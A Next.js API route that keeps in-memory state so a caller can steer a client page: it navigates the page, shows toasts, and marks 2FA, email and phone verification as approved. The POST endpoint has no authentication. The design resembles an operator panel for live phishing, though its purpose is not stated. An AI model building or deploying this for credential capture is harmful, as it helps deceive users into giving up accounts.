import { NextResponse } from 'next/server';

type RemoteControlState = {
  nav?: { id: number; targetPage: string };
  toast?: { id: number; message: string };
  verify?: { id: number; values: Partial<Record<'2fa' | 'email' | 'phone', boolean>> };
  updatedAt: number;
};

let remoteControlState: RemoteControlState = {
  updatedAt: Date.now(),
};
let nextNavId = 1;
let nextToastId = 1;
let nextVerifyId = 1;

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { action, targetPage, message } = body as {
      action: 'navigate' | 'clear' | 'toast' | 'clear_toast' | 'verify_approve' | 'verify_clear';
      targetPage?: string;
      message?: string;
      key?: '2fa' | 'email' | 'phone';
    };

    const now = Date.now();

    if (action === 'navigate') {
      if (!targetPage) return NextResponse.json({ error: 'targetPage is required' }, { status: 400 });
      remoteControlState = {
        ...remoteControlState,
        nav: { id: nextNavId++, targetPage },
        updatedAt: now,
      };
    } else if (action === 'clear') {
      remoteControlState = { ...remoteControlState, nav: undefined, updatedAt: now };
    } else if (action === 'toast') {
      const msg = String(message || '').trim();
      if (!msg) return NextResponse.json({ error: 'message is required' }, { status: 400 });
      remoteControlState = {
        ...remoteControlState,
        toast: { id: nextToastId++, message: msg },
        updatedAt: now,
      };
    } else if (action === 'clear_toast') {
      remoteControlState = {
        ...remoteControlState,
        toast: undefined,
        updatedAt: now,
      };
    } else if (action === 'verify_approve') {
      const key = body?.key as '2fa' | 'email' | 'phone' | undefined;
      if (!key) return NextResponse.json({ error: 'key is required' }, { status: 400 });
      const prev = remoteControlState.verify?.values || {};
      remoteControlState = {
        ...remoteControlState,
        verify: { id: nextVerifyId++, values: { ...prev, [key]: true } },
        updatedAt: now,
      };
    } else if (action === 'verify_clear') {
      remoteControlState = {
        ...remoteControlState,
        verify: { id: nextVerifyId++, values: {} },
        updatedAt: now,
      };
    } else {
      return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
    }

    return NextResponse.json(remoteControlState);
  } catch (e) {
    console.error('[remote-control] POST error:', e);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}

export async function GET() {
  return NextResponse.json(remoteControlState);
}


